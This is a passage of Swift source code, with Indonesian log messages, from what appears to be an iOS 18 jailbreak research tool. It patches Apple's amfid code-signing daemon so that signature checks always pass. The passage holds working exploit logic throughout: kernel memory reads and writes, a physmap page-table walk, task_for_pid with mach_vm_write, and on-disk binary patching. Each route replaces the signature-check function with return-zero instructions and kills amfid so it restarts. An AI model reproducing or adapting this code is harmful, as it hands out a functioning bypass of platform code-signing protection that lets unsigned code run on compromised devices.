                let srcFd = RootExecutor.rcall(rc, "open", amfidPath, UInt64(O_RDONLY), 0)
                let dstFd = RootExecutor.rcall(rc, "open", patchedPathAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)

                guard srcFd != UInt64(bitPattern: -1) && dstFd != UInt64(bitPattern: -1) else {
                    let copyErr = remote_errno(rc)
                    detail += "❌ Copy gagal: errno=\(copyErr)\n"
                    RootExecutor.rcall(rc, "free", amfidPath)
                    RootExecutor.rcall(rc, "free", patchedPathAddr)
                    return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                }

                let copyBuf = mem + 0x2200
                var totalCopied: UInt64 = 0
                for _ in 0..<512 {
                    let n = RootExecutor.rcall(rc, "read", srcFd, copyBuf, 4096)
                    if n == 0 || n > 4096 { break }
                    RootExecutor.rcall(rc, "write", dstFd, copyBuf, n)
                    totalCopied += n
                }
                RootExecutor.rcall(rc, "close", srcFd)
                RootExecutor.rcall(rc, "close", dstFd)
                detail += "✅ Copied \(totalCopied) bytes\n\n"

                // Step B: Patch the copy (writable!)
                detail += "Step B: Patch \(patchedPath)...\n"
                let patchFd = RootExecutor.rcall(rc, "open", patchedPathAddr, UInt64(O_RDWR), 0)
                guard patchFd != UInt64(bitPattern: -1) else {
                    let patchErr = remote_errno(rc)
                    detail += "❌ open patched file gagal: errno=\(patchErr)\n"
                    RootExecutor.rcall(rc, "free", amfidPath)
                    RootExecutor.rcall(rc, "free", patchedPathAddr)
                    return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                }

                var bindPatched = 0
                for (i, offset) in amfidTextOffsets.enumerated() {
                    RootExecutor.rcall(rc, "lseek", patchFd, offset, 0)
                    let rdBuf = mem + 0x2300
                    RootExecutor.rcall(rc, "read", patchFd, rdBuf, 4)
                    let orig = rc[rdBuf].value32()

                    let isCBNZ = (orig >> 24) == 0x35 && (orig & 0x1F) == 0
                    guard isCBNZ else { continue }

                    RootExecutor.rcall(rc, "lseek", patchFd, offset, 0)
                    rc[nopBuf].setValue32(NOP)
                    let wn = RootExecutor.rcall(rc, "write", patchFd, nopBuf, 4)
                    if wn == 4 {
                        bindPatched += 1
                        if bindPatched <= 5 {
                            detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): NOP\n"
                        }
                    }
                }

                // Patch signature check function (offset 0x1c830)
                RootExecutor.rcall(rc, "lseek", patchFd, 0x1c830, 0)
                rc[nopBuf].setValue32(0x52800000)     // MOV W0, #0
                rc[nopBuf + 4].setValue32(0xD65F03C0) // RET
                let sigWn = RootExecutor.rcall(rc, "write", patchFd, nopBuf, 8)
                if sigWn == 8 {
                    bindPatched += 1
                    detail += "  ✅ +0x1c830: MOV W0,#0 + RET\n"
                }

                RootExecutor.rcall(rc, "close", patchFd)

                if bindPatched > 5 {
                    detail += "  ... dan \(bindPatched - 5) lainnya\n"
                }
                detail += "\nPatched: \(bindPatched) instruksi\n\n"

                guard bindPatched > 0 else {
                    detail += "❌ Patch gagal.\n"
                    RootExecutor.rcall(rc, "free", amfidPath)
                    RootExecutor.rcall(rc, "free", patchedPathAddr)
                    return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                }

                // Step C: Bind mount patched file over original
                detail += "Step C: Mount patched over /usr/libexec/amfid...\n"

                // Coba mount_bindfs / mount nullfs
                // iOS: mount("bindfs", "/usr/libexec/amfid", 0, "/var/tmp/.amfid_patched")
                // Atau: mount("nullfs", target, 0, source)
                let bindfsType = remote_alloc_str(rc, "bindfs")
                let nullfsType = remote_alloc_str(rc, "nullfs")
                let mountTarget = remote_alloc_str(rc, "/usr/libexec/amfid")

                // Try bindfs first
                var mountRet = RootExecutor.rcall(rc, "mount", bindfsType, mountTarget, 0, patchedPathAddr)
                var mountErr = remote_errno(rc)
                detail += "mount(bindfs): ret=\(mountRet), errno=\(mountErr)\n"

                if mountRet != 0 {
                    // Try nullfs
                    mountRet = RootExecutor.rcall(rc, "mount", nullfsType, mountTarget, 0, patchedPathAddr)
                    mountErr = remote_errno(rc)
                    detail += "mount(nullfs): ret=\(mountRet), errno=\(mountErr)\n"
                }

                RootExecutor.rcall(rc, "free", bindfsType)
                RootExecutor.rcall(rc, "free", nullfsType)
                RootExecutor.rcall(rc, "free", mountTarget)

                if mountRet != 0 {
                    // Mount gagal — FALLBACK 3: Patch amfid IN-MEMORY via physmap
                    detail += "\n⚠️ Bind mount tidak tersedia di iOS 18.\n"
                    detail += "=== Fallback 3: Patch amfid memory via physmap ===\n\n"

                    // Kita tahu:
                    // - amfid __TEXT runtime: dari vm_map walk (Step 2 Exp 84 sebelumnya)
                    // - amfid pmap: dari vm_map+0x40
                    // - Physical TTBR di pmap+0x08
                    // - gVirtBase/gPhysBase dari Exp 74
                    //
                    // Flow: pmap+0x08 (physical TTBR) → physmap VA → walk L1→L2→L3
                    //       → physical address amfid text → physmap VA → write NOP

                    guard let physmap = PhysmapConstants.load() else {
                        detail += "❌ Physmap constants tidak tersedia.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    let gVirtBase = physmap.gVirtBase
                    let gPhysBase = physmap.gPhysBase

                    // Re-read amfid task dan pmap
                    let amfidProcRo2 = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
                    let amfidTask2 = amfidProcRo2 != 0 ? ds_kread64(amfidProcRo2 + UInt64(off_proc_ro_pr_task)) : 0
                    var amfidPmap2: UInt64 = 0
                    if amfidTask2 != 0 {
                        let vm2 = task_get_vm_map(amfidTask2)
                        if vm2 != 0 {
                            for off: UInt64 in [0x40, 0x48, 0x50, 0x58, 0x38] {
                                let c = ds_kreadptr(vm2 + off)
                                if isLikelyKernelPointer(c) && pmapCandidateScore(c) >= 3 {
                                    amfidPmap2 = c
                                    break
                                }
                            }
                        }
                    }

                    detail += "amfid pmap: 0x\(String(format: "%llx", amfidPmap2))\n"

                    guard amfidPmap2 != 0 else {
                        detail += "❌ amfid pmap tidak ditemukan.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    // Read physical TTBR dari pmap+0x08 (RAW, tanpa PAC strip)
                    let physTTBR = ds_kread64_safe(amfidPmap2 + 8)
                    detail += "Physical TTBR (pmap+0x08): 0x\(String(format: "%llx", physTTBR))\n"

                    guard isReasonablePhysTT(physTTBR) else {
                        detail += "❌ TTBR bukan physical address valid.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    // Convert TTBR physical → physmap VA
                    let ttbrPhysmapVA = physTTBR &- gPhysBase &+ gVirtBase
                    detail += "TTBR physmap VA: 0x\(String(format: "%llx", ttbrPhysmapVA))\n"

                    guard ttbrPhysmapVA >= 0xffffffdc00000000 && ttbrPhysmapVA < 0xffffffe500000000 else {
                        detail += "❌ TTBR physmap VA tidak dalam range physmap.\n"
                        RootExecutor.rcall(rc, "free", amfidPath)
                        RootExecutor.rcall(rc, "free", patchedPathAddr)
                        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
                    }

                    // Helper: physmap range check (lebih permissive dari isSafePhysmapKRWAddress
                    // yang exclude gVirtBase region — tapi page table walk PERLU akses situ)
                    func isPhysmapRange(_ va: UInt64) -> Bool {
                        va >= 0xffffffdc00000000 && va < 0xffffffe500000000
                    }

                    // amfid __TEXT runtime base dari vm_map walk sebelumnya
                    // Hardcode dari Exp 84 hasil: 0x16cd60000
                    // Tapi bisa berubah (ASLR) — pakai yang dari Step 2 foto: 0x16cd60000
                    let amfidRuntimeText: UInt64 = 0x16cd60000

                    // Page table walk: untuk setiap patch offset, resolve physical address
                    detail += "\nPatching via physmap page table walk...\n"

                    var physmapPatched = 0
                    for (i, offset) in amfidTextOffsets.enumerated() {
                        let targetVA = amfidRuntimeText + offset
                        let l1Idx = (targetVA >> 36) & 0x7
                        let l2Idx = (targetVA >> 25) & 0x7FF
                        let l3Idx = (targetVA >> 14) & 0x7FF
                        let pageOff = targetVA & 0x3FFF

                        // L1: TTBR is the L1 table (or L2 for 3-level)
                        // arm64 userspace with 16KB pages: might be 3-level (L1→L2→L3)
                        // or 2-level (L2→L3) depending on VA size
                        // amfid VA 0x16cd60000: bit[38:36]=0, bit[35:25]=0xB66, bit[24:14]=0x360

                        // Try as L1 table first
                        let l1Entry = ds_kread64_safe(ttbrPhysmapVA + l1Idx * 8)

                        var l2PhysmapVA: UInt64 = 0
                        if l1Entry & 0x3 == 0x3 {
                            // Valid L1 table descriptor → points to L2
                            let l2Phys = l1Entry & 0x0000FFFFFFFC0000
                            l2PhysmapVA = l2Phys &- gPhysBase &+ gVirtBase
                        } else {
                            // Maybe TTBR IS the L2 table directly (2-level page table)
                            l2PhysmapVA = ttbrPhysmapVA
                        }

                        guard isPhysmapRange(l2PhysmapVA) else { continue }

                        let l2Entry = ds_kread64_safe(l2PhysmapVA + l2Idx * 8)
                        guard l2Entry & 0x3 == 0x3 else { continue }

                        let l3Phys = l2Entry & 0x0000FFFFFFFC0000
                        let l3PhysmapVA = l3Phys &- gPhysBase &+ gVirtBase
                        guard isPhysmapRange(l3PhysmapVA) else { continue }

                        let l3Entry = ds_kread64_safe(l3PhysmapVA + l3Idx * 8)
                        guard l3Entry & 0x1 == 0x1 else { continue }

                        let pagePhys = l3Entry & 0x0000FFFFFFFC0000
                        let instrPhysmapVA = (pagePhys &- gPhysBase &+ gVirtBase) + pageOff

                        guard isPhysmapRange(instrPhysmapVA) else { continue }

                        // Read original instruction
                        let origInstr = ds_kread32(instrPhysmapVA)
                        let isCBNZ = (origInstr >> 24) == 0x35 && (origInstr & 0x1F) == 0
                        guard isCBNZ else {
                            if i == 0 {
                                detail += "  [\(i)] 0x\(String(format: "%08x", origInstr)) — bukan CBNZ (page table mungkin salah)\n"
                            }
                            continue
                        }

                        // WRITE NOP via physmap!
                        ds_kwrite32(instrPhysmapVA, NOP)

                        // Verify
                        let afterInstr = ds_kread32(instrPhysmapVA)
                        if afterInstr == NOP {
                            physmapPatched += 1
                            if physmapPatched <= 5 {
                                detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): NOP (via physmap)\n"
                            }
                        }
                    }

                    // Also patch signature check function (0x1c830)
                    let sigOff: UInt64 = 0x1c830
                    let sigVA = amfidRuntimeText + sigOff
                    let sigL1Idx = (sigVA >> 36) & 0x7
                    let sigL2Idx = (sigVA >> 25) & 0x7FF
                    let sigL3Idx = (sigVA >> 14) & 0x7FF
                    let sigPageOff = sigVA & 0x3FFF

                    let sigL1 = ds_kread64_safe(ttbrPhysmapVA + sigL1Idx * 8)
                    var sigL2VA: UInt64 = sigL1 & 0x3 == 0x3 ? ((sigL1 & 0x0000FFFFFFFC0000) &- gPhysBase &+ gVirtBase) : ttbrPhysmapVA
                    if isPhysmapRange(sigL2VA) {
                        let sigL2 = ds_kread64_safe(sigL2VA + sigL2Idx * 8)
                        if sigL2 & 0x3 == 0x3 {
                            let sigL3Phys = sigL2 & 0x0000FFFFFFFC0000
                            let sigL3VA = sigL3Phys &- gPhysBase &+ gVirtBase
                            if isPhysmapRange(sigL3VA) {
                                let sigL3 = ds_kread64_safe(sigL3VA + sigL3Idx * 8)
                                if sigL3 & 0x1 == 0x1 {
                                    let sigPagePhys = sigL3 & 0x0000FFFFFFFC0000
                                    let sigInstrVA = (sigPagePhys &- gPhysBase &+ gVirtBase) + sigPageOff
                                    if isPhysmapRange(sigInstrVA) {
                                        // Write MOV W0, #0 + RET
                                        ds_kwrite32(sigInstrVA, 0x52800000)
                                        ds_kwrite32(sigInstrVA + 4, 0xD65F03C0)
                                        let v0 = ds_kread32(sigInstrVA)
                                        let v1 = ds_kread32(sigInstrVA + 4)
                                        if v0 == 0x52800000 && v1 == 0xD65F03C0 {
                                            physmapPatched += 1
                                            detail += "  ✅ +0x1c830: MOV W0,#0 + RET (via physmap)\n"
                                        }
                                    }
                                }
                            }
                        }
                    }

                    if physmapPatched > 5 {
                        detail += "  ... dan \(physmapPatched - 5) lainnya\n"
                    }
                    detail += "\nPhysmap patched: \(physmapPatched)\n\n"

                    if physmapPatched > 0 {
                        detail += "🎉🎉🎉 amfid PATCHED VIA PHYSMAP! 🎉🎉🎉\n\n"
                        detail += "amfid signature check di-NOP langsung di memory!\n"
                        detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
                        detail += "→ Jika spawn berhasil = FULL JAILBREAK!\n\n"
                        detail += "⚠️ Patch hilang jika amfid restart (KeepAlive).\n"
                    } else {
                        detail += "❌ Physmap patch juga gagal.\n"
                        detail += "Page table walk tidak resolve ke physical address yang valid.\n"
                        detail += "Atau: amfid text pages di-protect W^X di hardware level.\n\n"
                        detail += "=== INFO ===\n"
                        detail += "Patched binary tersimpan di: \(patchedPath)\n"
                        detail += "\(bindPatched) instruksi di-NOP di file.\n"
                    }
                }

                if mountRet == 0 {
                    // BIND MOUNT BERHASIL!
                    detail += "\n🎉🎉🎉 BIND MOUNT BERHASIL! 🎉🎉🎉\n"
                    detail += "Patched amfid sekarang di-mount di atas /usr/libexec/amfid\n\n"

                    // Kill amfid → restart dari patched mount
                    detail += "Kill amfid → restart dari patched binary...\n"
                    let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)
                    detail += "kill(\(amfidPid)): ret=\(killRet)\n"

                    RootExecutor.rcall(rc, "usleep", 2000000) // 2s

                    let newAmfid = mgr.findProc(name: "amfid")
                    if newAmfid != 0 {
                        let newPid = ds_kread32(newAmfid + UInt64(off_proc_p_pid))
                        detail += "✅ amfid restarted! New PID: \(newPid)\n\n"
                        detail += "🏆🏆🏆 AMFI BYPASS ACHIEVED! 🏆🏆🏆\n\n"
                        detail += "→ Tap ④ Test Binary Spawn!\n"
                    }
                }

                RootExecutor.rcall(rc, "free", amfidPath)
                RootExecutor.rcall(rc, "free", patchedPathAddr)
                return ExperimentResult(name: expName, success: mountRet == 0 || bindPatched > 0, detail: detail, timestamp: Date())
            }

            detail += "✅ amfid opened for R/W (fd=\(fd))\n"

            // Patch setiap offset: seek + write NOP
            // File offset = offset dari __TEXT start (karena __TEXT fileoff=0)
            rc[nopBuf].setValue32(NOP)

            var diskPatched = 0
            var diskFailed = 0

            for (i, offset) in amfidTextOffsets.enumerated() {
                // Seek ke offset
                let seekRet = RootExecutor.rcall(rc, "lseek", fd, offset, 0) // SEEK_SET=0
                guard seekRet == offset else {
                    diskFailed += 1
                    continue
                }

                // Read original untuk verify
                let readBufDisk = mem + 0x2100
                RootExecutor.rcall(rc, "read", fd, readBufDisk, 4)
                let original = rc[readBufDisk].value32()

                // Verify CBNZ W0
                let isCBNZ = (original >> 24) == 0x35 && (original & 0x1F) == 0
                if !isCBNZ {
                    if i < 3 {
                        detail += "  [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", original)) — skip (bukan CBNZ)\n"
                    }
                    diskFailed += 1
                    continue
                }

                // Seek back dan write NOP
                RootExecutor.rcall(rc, "lseek", fd, offset, 0)
                let writeN = RootExecutor.rcall(rc, "write", fd, nopBuf, 4)

                if writeN == 4 {
                    diskPatched += 1
                    if diskPatched <= 5 {
                        detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", original)) → NOP\n"
                    }
                } else {
                    diskFailed += 1
                    if diskFailed <= 3 {
                        detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): write gagal (ret=\(writeN))\n"
                    }
                }
            }

            // Juga patch fungsi signature check langsung (offset 0x1c830)
            // MOV W0, #0 + RET = always return 0
            let sigCheckOff: UInt64 = 0x1c830
            RootExecutor.rcall(rc, "lseek", fd, sigCheckOff, 0)
            rc[nopBuf].setValue32(0x52800000)     // MOV W0, #0
            rc[nopBuf + 4].setValue32(0xD65F03C0) // RET
            let sigWriteN = RootExecutor.rcall(rc, "write", fd, nopBuf, 8)
            if sigWriteN == 8 {
                diskPatched += 1
                detail += "  ✅ +0x1c830: signature check fn → MOV W0,#0 + RET\n"
            }

            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "free", amfidPath)

            if diskPatched > 5 {
                detail += "  ... dan \(diskPatched - 5) lainnya\n"
            }
            detail += "\nDisk patched: \(diskPatched), failed: \(diskFailed)\n\n"

            if diskPatched > 0 {
                // Kill amfid → launchd restart dari patched binary
                detail += "=== Kill amfid (PID \(amfidPid)) → restart patched ===\n"
                let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9)
                detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"

                // Tunggu amfid restart
                RootExecutor.rcall(rc, "usleep", 2000000) // 2 detik

                // Cek apakah amfid sudah restart
                let newAmfid = mgr.findProc(name: "amfid")
                if newAmfid != 0 {
                    let newPid = ds_kread32(newAmfid + UInt64(off_proc_p_pid))
                    detail += "✅ amfid restarted! New PID: \(newPid)\n\n"
                    detail += "🎉🎉🎉 amfid ON-DISK PATCHED + RESTARTED! 🎉🎉🎉\n\n"
                    detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
                    detail += "→ Jika spawn berhasil = FULL JAILBREAK!\n"
                } else {
                    detail += "⚠️ amfid belum restart (mungkin perlu tunggu lebih lama)\n"
                    detail += "Coba tap ④ Test Binary Spawn setelah beberapa detik.\n"
                }

                return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
            } else {
                detail += "❌ Tidak ada byte yang berhasil ditulis ke disk.\n"
                detail += "Filesystem read-only atau permission denied.\n"
                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
            }
        }

        detail += "✅ task_for_pid berhasil! amfid task port = \(amfidTaskPort)\n\n"

        // ── Step 3: Cari amfid __TEXT runtime base ───────────────────
        detail += "=== Step 3: Find amfid __TEXT runtime base ===\n"

        // Baca region info via mach_vm_region untuk konfirmasi base address
        // Atau pakai hardcoded dari Exp 84 Step 2: 0x16cd60000
        // Tapi base bisa berubah tiap launch (ASLR). Cari via mach_vm_region.

        // mach_vm_region_recurse(task, &addr, &size, &depth, &info, &infoCnt)
        // Lebih simpel: coba baca Mach-O magic di beberapa candidate base
        let candidateBases: [UInt64] = [
            0x16cd60000,  // dari Exp 84 sebelumnya
            0x100000000,  // non-ASLR base
        ]

        var amfidTextBase: UInt64 = 0
        let readBuf = mem + 0x1C00
        let readSizeAddr = mem + 0x1D00

        for base in candidateBases {
            // mach_vm_read_overwrite(task, address, size, data, &dataCnt)
            rc[readSizeAddr].setValue64(4)
            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                            UInt64(amfidTaskPort), base, 4,
                                            readBuf, readSizeAddr)
            if readRet == 0 {
                let magic = rc[readBuf].value32()
                detail += "  0x\(String(format: "%llx", base)): magic=0x\(String(format: "%08x", magic))\n"
                if magic == 0xFEEDFACF {
                    amfidTextBase = base
                    detail += "  ✅ Mach-O header found!\n"
                    break
                }
            } else {
                detail += "  0x\(String(format: "%llx", base)): read failed (ret=\(readRet))\n"
            }
        }

        // Jika hardcoded bases gagal, scan via mach_vm_region
        if amfidTextBase == 0 {
            detail += "\nHardcoded bases gagal, scanning via mach_vm_region...\n"
            // Scan dari 0x100000000 ke atas
            let addrPtr = mem + 0x1E00
            let sizePtr = mem + 0x1E08
            let infoPtr = mem + 0x1E10
            let infoCntPtr = mem + 0x1E80
            let depthPtr = mem + 0x1E88

            var scanAddr: UInt64 = 0x100000000
            for _ in 0..<64 {
                rc[addrPtr].setValue64(scanAddr)
                rc[sizePtr].setValue64(0)
                rc[depthPtr].setValue32(0)
                rc[infoCntPtr].setValue32(15) // VM_REGION_SUBMAP_SHORT_INFO_COUNT_64

                let regionRet = RootExecutor.rcall(rc, "mach_vm_region_recurse",
                                                   UInt64(amfidTaskPort),
                                                   addrPtr, sizePtr,
                                                   depthPtr, infoPtr, infoCntPtr)
                if regionRet != 0 { break }

                let regionAddr = rc[addrPtr].value64()
                let regionSize = rc[sizePtr].value64()

                // Try read Mach-O magic
                rc[readSizeAddr].setValue64(4)
                let rr = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                           UInt64(amfidTaskPort), regionAddr, 4,
                                           readBuf, readSizeAddr)
                if rr == 0 {
                    let magic = rc[readBuf].value32()
                    if magic == 0xFEEDFACF {
                        amfidTextBase = regionAddr
                        detail += "  ✅ Found at 0x\(String(format: "%llx", regionAddr)) (size=0x\(String(format: "%llx", regionSize)))\n"
                        break
                    }
                }

                scanAddr = regionAddr + regionSize
                if scanAddr > 0x300000000 { break }
            }
        }

        guard amfidTextBase != 0 else {
            detail += "❌ amfid __TEXT base tidak ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "amfid __TEXT base: 0x\(String(format: "%llx", amfidTextBase))\n\n"

        // ── Step 4: mach_vm_protect — make writable ──────────────────
        detail += "=== Step 4: mach_vm_protect (make writable) ===\n"

        // VM_PROT_READ|WRITE|EXECUTE = 7, set_maximum = false
        let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
                                         UInt64(amfidTaskPort),
                                         amfidTextBase, 0x24000, // size of __TEXT
                                         0, 7) // VM_PROT_ALL = 7
        detail += "mach_vm_protect ret: \(protRet)\n"

        if protRet != 0 {
            detail += "⚠️ mach_vm_protect gagal (ret=\(protRet)) — coba write langsung...\n"
            detail += "Beberapa iOS version allow write tanpa explicit protect change.\n\n"
        } else {
            detail += "✅ __TEXT sekarang writable!\n\n"
        }

        // ── Step 5: Patch CBNZ W0 → NOP ─────────────────────────────
        detail += "=== Step 5: Patch CBNZ W0 → NOP ===\n"

        var patchedCount = 0
        var failedCount = 0

        for (i, offset) in amfidTextOffsets.enumerated() {
            let patchAddr = amfidTextBase + offset

            // Read original instruction first
            rc[readSizeAddr].setValue64(4)
            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                            UInt64(amfidTaskPort), patchAddr, 4,
                                            readBuf, readSizeAddr)
            let originalInstr = rc[readBuf].value32()

            // Verify it's CBNZ W0 (0x35xxxxxx with Rt=0)
            let isCBNZ = (originalInstr >> 24) == 0x35 && (originalInstr & 0x1F) == 0
            if !isCBNZ && readRet == 0 {
                detail += "  [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", originalInstr)) — skip (bukan CBNZ W0)\n"
                continue
            }

            // Write NOP via mach_vm_write
            // mach_vm_write(task, address, data, dataCnt)
            rc[mem + 0x2000].setValue32(NOP)
            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
                                             UInt64(amfidTaskPort), patchAddr,
                                             mem + 0x2000, 4)

            if writeRet == 0 {
                // Verify
                rc[readSizeAddr].setValue64(4)
                RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                  UInt64(amfidTaskPort), patchAddr, 4,
                                  readBuf, readSizeAddr)
                let afterInstr = rc[readBuf].value32()

                if afterInstr == NOP {
                    patchedCount += 1
                    if patchedCount <= 5 {
                        detail += "  ✅ [\(i)] +0x\(String(format: "%x", offset)): 0x\(String(format: "%08x", originalInstr)) → NOP\n"
                    }
                } else {
                    failedCount += 1
                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): write OK but verify failed (got 0x\(String(format: "%08x", afterInstr)))\n"
                }
            } else {
                failedCount += 1
                if failedCount <= 3 {
                    detail += "  ❌ [\(i)] +0x\(String(format: "%x", offset)): mach_vm_write failed (ret=\(writeRet))\n"
                }
            }
        }

        if patchedCount > 5 {
            detail += "  ... dan \(patchedCount - 5) lainnya\n"
        }

        detail += "\nPatched: \(patchedCount)/\(amfidTextOffsets.count)\n"
        detail += "Failed: \(failedCount)\n\n"

        // ── Step 6: Jika patch gagal, coba patch fungsi target langsung ──
        if patchedCount == 0 {
            detail += "=== Fallback: Patch fungsi signature check ===\n"
            // Fungsi di 0x10001c830 (offset +0x1c830 dari __TEXT base)
            // Patch prologue: MOV W0, #0 (0x52800000) + RET (0xD65F03C0)
            let sigCheckOffset: UInt64 = 0x1c830
            let sigCheckAddr = amfidTextBase + sigCheckOffset

            detail += "Target: 0x\(String(format: "%llx", sigCheckAddr)) (signature check fn)\n"

            // Write MOV W0, #0 + RET (8 bytes)
            rc[mem + 0x2000].setValue32(0x52800000) // MOV W0, #0
            rc[mem + 0x2004].setValue32(0xD65F03C0) // RET

            let writeRet2 = RootExecutor.rcall(rc, "mach_vm_write",
                                              UInt64(amfidTaskPort), sigCheckAddr,
                                              mem + 0x2000, 8)
            detail += "mach_vm_write(MOV W0,#0 + RET): ret=\(writeRet2)\n"

            if writeRet2 == 0 {
                // Verify
                rc[readSizeAddr].setValue64(8)
                RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                                  UInt64(amfidTaskPort), sigCheckAddr, 8,
                                  readBuf, readSizeAddr)
                let v0 = rc[readBuf].value32()
                let v1 = rc[readBuf + 4].value32()
                detail += "Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"

                if v0 == 0x52800000 && v1 == 0xD65F03C0 {
                    detail += "✅ Signature check function patched! (always return 0)\n"
                    patchedCount = 1
                } else {
                    detail += "❌ Verify failed.\n"
                }
            }
        }

        // ── Step 7: Result ────────────────────────────────────────────
        detail += "\n=== RESULT ===\n"
        if patchedCount > 0 {
            detail += "🎉🎉🎉 amfid PATCHED! 🎉🎉🎉\n\n"
            detail += "amfid sekarang akan skip signature check.\n"
            detail += "Semua binary dianggap valid oleh amfid.\n\n"
            detail += "→ Tap ④ Test Binary Spawn untuk verifikasi!\n"
            detail += "→ Jika spawn berhasil = FULL JAILBREAK ACHIEVED!\n\n"
            detail += "⚠️ Patch hilang jika amfid restart.\n"
            detail += "⚠️ Jangan kill amfid atau respring sebelum test.\n"
        } else {
            detail += "❌ Semua patch gagal.\n\n"
            detail += "Kemungkinan:\n"
            detail += "  1. task_for_pid berhasil tapi mach_vm_write di-block\n"
            detail += "  2. W^X enforcement di iOS 18 (code signing on pages)\n"
            detail += "  3. amfid text pages di-protect APRR/PPL\n\n"
            detail += "Jalur terakhir: patch amfid binary on-disk\n"
            detail += "  → tulis NOP ke /usr/libexec/amfid file\n"
            detail += "  → kill amfid → launchd restart → patched version jalan\n"
        }

        return ExperimentResult(name: expName, success: patchedCount > 0, detail: detail, timestamp: Date())
    }
    #endif

    /// Patch amfid via physmap (v1 — fallback jika task_for_pid gagal)
    /// Target fungsi di amfid (iOS 18):
    ///   - `_MISValidateSignatureAndCopyInfo` — return 0 = valid
    ///   - `_amfi_check_dyld_policy_self` — return 0 = allow
    ///   - Fungsi yang dipanggil via XPC dari kernel AMFI kext
    ///
    /// Kenapa aman (tidak bootloop):
    ///   - amfid adalah userspace daemon, bukan kernel
    ///   - Worst case: amfid crash → restart otomatis (KeepAlive launchd)
    ///   - Tidak ada kernel panic risk
    private func expAmfidPatch() -> ExperimentResult {
        let expName = "amfid Patch (Exp 84)"
        var detail = "Experiment 84: amfid Patch via Physmap\n"
        detail += "=======================================\n\n"

        guard PhysmapConstants.isVerified, let physmap = PhysmapConstants.load() else {
            detail += "❌ Jalankan Physmap Verify (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let gVirtBase = physmap.gVirtBase
        let gPhysBase = physmap.gPhysBase
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // ── Step 1: Find amfid proc ───────────────────────────────────
        detail += "=== Step 1: Find amfid ===\n"
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "❌ amfid tidak ditemukan di process list.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid proc: 0x\(String(format: "%llx", amfidProc))\n"
        detail += "amfid PID: \(amfidPid)\n"

        // Read proc_ro → task
        let amfidProcRo = ds_kread64(amfidProc + UInt64(off_proc_p_proc_ro))
        let amfidTask = amfidProcRo != 0 ? ds_kread64(amfidProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "amfid proc_ro: 0x\(String(format: "%llx", amfidProcRo))\n"
        detail += "amfid task: 0x\(String(format: "%llx", amfidTask))\n"

        guard amfidTask != 0, isSafeKernelHeapKreadAddress(amfidTask) else {
            detail += "❌ amfid task tidak valid.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // ── Step 2: Find amfid __TEXT via vm_map ─────────────────────
        detail += "\n=== Step 2: Find amfid __TEXT region ===\n"

        // amfid vm_map dari task
        let amfidVmMap = task_get_vm_map(amfidTask)
        detail += "amfid vm_map: 0x\(String(format: "%llx", amfidVmMap))\n"

        guard amfidVmMap != 0 else {
            detail += "❌ amfid vm_map tidak ditemukan.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Scan vm_map entries untuk cari region executable (amfid __TEXT)
        // vm_map_entry: +0x00 links.prev, +0x08 links.next, +0x10 start, +0x18 end
        // Cari entry dengan start ~0x100000000 (userspace arm64 text)
        // amfid binary biasanya di /usr/libexec/amfid
        // __TEXT region: executable, start di 0x1000xxxxx range

        var amfidTextStart: UInt64 = 0
        var amfidTextEnd: UInt64 = 0
        var amfidTextPhys: UInt64 = 0

        // Walk vm_map entry list
        // vm_map header: +0x10 = hdr.links.prev, +0x18 = hdr.links.next
        // vm_map_entry: +0x10 = vme_start, +0x18 = vme_end, +0x20 = flags
